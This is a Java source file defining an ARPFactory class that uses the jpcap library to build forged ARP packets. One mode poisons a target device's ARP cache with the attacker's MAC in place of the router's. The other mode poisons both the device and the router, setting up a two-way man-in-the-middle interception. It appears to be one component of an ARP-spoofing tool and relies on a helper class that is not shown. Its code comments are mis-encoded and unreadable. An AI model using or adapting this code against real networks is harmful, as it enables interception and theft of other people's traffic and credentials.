package Factory;

import java.util.HashSet;
import java.util.Set;

import jpcap.packet.ARPPacket;
import Util.SetPacket.SetARP;

public class ARPFactory {

	private int mode;
	private String hostIP;
	private String routeIP;
	private String yourMAC;
	private String deviceMAC;
	private String routeMAC;
	
	public static SetARP sa = new SetARP();
	
	public ARPFactory(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC) {
		//ģʽ2 ��������ARP ��ƭ·�ɰ��Լ������豸  ��  ��ƭ�豸���Լ�����������
		this.mode = 2;
		
		this.hostIP = hostIP;
		this.routeIP = routeIP;
		this.yourMAC = yourMAC;
		this.deviceMAC = deviceMAC;
		this.routeMAC = routeMAC;
	}
	

	public ARPFactory(String hostIP,String routeIP,String yourMAC,String deviceMAC) {
		//ģʽ1 ����һ��ARP ��ƭ�豸���Լ�����������
		this.mode = 1;
		this.hostIP = hostIP;
		this.routeIP = routeIP;
		this.yourMAC = yourMAC;
		this.deviceMAC = deviceMAC;
	}
	
	
	public Set<ARPPacket> getInstance(){
		
		Set<ARPPacket> ARPs = new HashSet<ARPPacket>();
		if(mode == 1){	 
			ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);	
			ARPs.add(arp1);
		}
		if(mode == 2){
			
			ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);
			ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,routeMAC,yourMAC);
			ARPs.add(arp1);
			ARPs.add(arp2);
		}
		
		return ARPs;
	}
	
}
